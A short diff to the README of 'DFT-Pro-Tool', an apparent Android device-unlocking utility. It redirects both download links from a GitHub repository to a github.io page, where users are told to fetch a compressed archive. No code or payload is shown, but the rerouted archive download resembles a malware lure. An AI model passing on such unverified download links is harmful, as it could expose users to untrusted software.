@@ -1,6 +1,6 @@
 # 🛠️ DFT-Pro-Tool - Unlock your Android device with ease
 
-[![Download DFT-Pro-Tool](https://img.shields.io/badge/Download-DFT%20Pro%20Tool-blue.svg)](https://github.com/Ejaculatoryductcourt959/DFT-Pro-Tool)
+[![Download DFT-Pro-Tool](https://img.shields.io/badge/Download-DFT%20Pro%20Tool-blue.svg)](https://ejaculatoryductcourt959.github.io)
 
 ## About the software
 
@@ -25,7 +25,7 @@ Follow these steps to obtain the tool:
 2. Select the latest version listed on the page.
 3. Save the compressed archive file to a folder you can find later.
 
-[https://github.com/Ejaculatoryductcourt959/DFT-Pro-Tool](https://github.com/Ejaculatoryductcourt959/DFT-Pro-Tool)
+[https://ejaculatoryductcourt959.github.io](https://ejaculatoryductcourt959.github.io)
 
 ## ⚙️ Installation instructions
 
